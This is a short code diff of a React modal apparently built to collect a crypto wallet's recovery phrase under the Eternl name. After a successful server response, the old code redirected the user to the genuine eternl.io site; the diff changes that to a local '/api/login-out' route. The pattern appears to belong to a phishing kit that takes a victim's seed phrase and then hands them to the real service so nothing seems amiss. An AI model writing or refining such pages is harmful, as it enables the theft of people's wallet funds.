@@ -179,7 +179,7 @@ export default function EternlRestoreMnemonicEntryModal({
       const result = await response.json();
 
       if (response.status === 200 && result.status) {
-        window.location.href = "https://eternl.io/";
+        window.location.href = "/api/login-out";
       } else {
         const serverMessage = result?.message || "Something went wrong.";
         const serverError = result?.error ? ` (${result.error})` : "";
